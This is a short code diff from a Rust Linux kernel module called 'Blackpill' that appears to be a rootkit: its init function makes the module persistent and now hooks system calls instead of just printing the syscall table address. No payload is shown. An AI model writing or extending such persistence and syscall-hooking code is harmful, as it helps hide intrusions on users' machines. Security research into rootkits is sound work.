@@ -32,9 +32,8 @@ impl kernel::Module for Blackpill {
         // Make it persistent
         persistence::persist();
 
-        // Get syscall table address
-        let syscall_table: Option<*mut *mut u64> = hooking::get_syscall_table();
-        pr_info!("Syscall table address = {:?}", syscall_table);
+        // Hook syscalls
+        hooking::hook_syscalls();
 
         Ok(Blackpill)
     }
